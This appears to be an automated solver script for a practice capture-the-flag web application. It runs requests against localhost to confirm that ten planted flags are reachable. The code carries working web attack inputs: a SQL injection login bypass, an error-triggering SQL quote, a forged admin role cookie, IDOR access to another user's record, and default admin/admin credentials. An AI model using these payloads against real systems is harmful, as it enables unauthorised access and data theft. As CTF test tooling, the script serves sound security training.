// Automated solver: proves all 10 flags are actually reachable.
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { FLAGS, TOTAL_POINTS } from './flags.js'

const ROOT = path.dirname(fileURLToPath(import.meta.url))
const BASE = process.env.BASE_URL || 'http://localhost:7000'
const results = []

const check = (id, label, ok, detail = '') => {
  results.push({ id, ok, label, detail })
  console.log(`${ok ? 'PASS' : 'FAIL'} ${String(id).padStart(2, '0')} ${label}${detail ? ' :: ' + detail : ''}`)
}

const get = async (url, headers = {}) => {
  const res = await fetch(BASE + url, { headers })
  return { res, text: await res.text() }
}

const postJson = async (url, body, headers = {}) => {
  const res = await fetch(BASE + url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body)
  })
  return { res, text: await res.text() }
}

// Player account used by the submission checks.
const playerName = `verifier_${Date.now().toString(36)}`
const registered = await postJson('/api/player/register', { username: playerName, password: 'verify-pass-123' })
const playerCookie = (registered.res.headers.getSetCookie?.() || [])
  .map((c) => c.split('=')[0] + '=' + c.split('=')[1].split(';')[0]).join('; ')
const unauth = await postJson('/api/submit', { flag: FLAGS[0].flag })
check(16, 'submit requires login', unauth.res.status === 401 && playerCookie.includes('player_session='))

// 01 - client source comment
const clientHtml = fs.readFileSync(path.join(ROOT, '../client/index.html'), 'utf8')
check(1, 'HTML comment', clientHtml.includes(FLAGS[0].flag))

// 02 - robots.txt
const robots = await get('/robots.txt')
check(2, 'robots.txt', robots.text.includes(FLAGS[1].flag))

// 03 - auth bypass SQLi
const bypass = await postJson('/api/login', { username: "' OR '1'='1' -- ", password: 'x' })
const bypassCookie = (bypass.res.headers.getSetCookie?.() || []).map((c) => c.split('=')[0] + '=' + c.split('=')[1].split(';')[0]).join('; ')
const admin = await get('/admin', { Cookie: bypassCookie })
check(3, 'auth bypass', admin.text.includes(FLAGS[2].flag), admin.text.slice(0, 90))

// 04 - cookie role forgery
const normal = await postJson('/api/login', { username: 'varun', password: 'hunter2' })
const forged = 'role=admin; auth=1'
const member = await get('/member', { Cookie: forged })
check(4, 'cookie forgery', member.text.includes(FLAGS[3].flag) && !normal.text.includes(FLAGS[2].flag))

// 05 - IDOR
const user = await get('/api/users/2')
check(5, 'IDOR', user.text.includes(FLAGS[4].flag))

// 06 - error based SQLi
const err = await get('/api/search?q=' + encodeURIComponent("'"))
check(6, 'error SQLi', err.text.includes(FLAGS[5].flag))

// 07 - exposed debug endpoint
const debug = await get('/api/debug')
check(7, 'debug endpoint', debug.text.includes(FLAGS[6].flag))

// 08 - flag in response header
const health = await get('/api/health')
check(8, 'header disclosure', health.res.headers.get('x-ctf-flag') === FLAGS[7].flag && health.text.includes(`"flags":${FLAGS.length}`))

// 09 - secret shipped in static client config
const config = await get('/assets/config.js')
check(9, 'client-side secret', config.text.includes(FLAGS[8].flag))

// 10 - legacy login with default credentials
const legacy = await postJson('/legacy-login', { username: 'admin', password: 'admin' })
check(10, 'default credentials', legacy.text.includes(FLAGS[9].flag))

// authenticated checker
let allSubmitted = true
for (const f of FLAGS) {
  const r = await postJson('/api/submit', { flag: f.flag }, { Cookie: playerCookie })
  if (!r.text.includes('"status":"correct"')) allSubmitted = false
}
check(17, `flag checker accepts all ${FLAGS.length}`, allSubmitted)

const board = await get('/api/leaderboard')
const boardData = JSON.parse(board.text)
const myRow = boardData.rows.find((row) => row.username === playerName)
check(18, 'REST leaderboard reflects solves', !!myRow && myRow.solved === FLAGS.length && myRow.points === TOTAL_POINTS)

const stream = await fetch(`${BASE}/api/leaderboard/stream`)
const streamType = stream.headers.get('content-type') || ''
const reader = stream.body.getReader()
const first = await reader.read()
const firstChunk = new TextDecoder().decode(first.value || new Uint8Array())
await reader.cancel()
check(19, 'live leaderboard SSE stream', streamType.includes('text/event-stream') && firstChunk.includes(playerName))

// Remove artifacts created by this run so the event starts clean.
const { db } = await import('./db.js')
const verifier = db.prepare('SELECT id FROM players WHERE username = ?').get(playerName)
if (verifier) {
  db.prepare('DELETE FROM player_submissions WHERE player_id = ?').run(verifier.id)
  db.prepare('DELETE FROM player_sessions WHERE player_id = ?').run(verifier.id)
  db.prepare('DELETE FROM players WHERE id = ?').run(verifier.id)
}

const failed = results.filter((r) => !r.ok)
console.log(`\n${results.length - failed.length}/${results.length} checks passed`)
process.exit(failed.length ? 1 : 0)
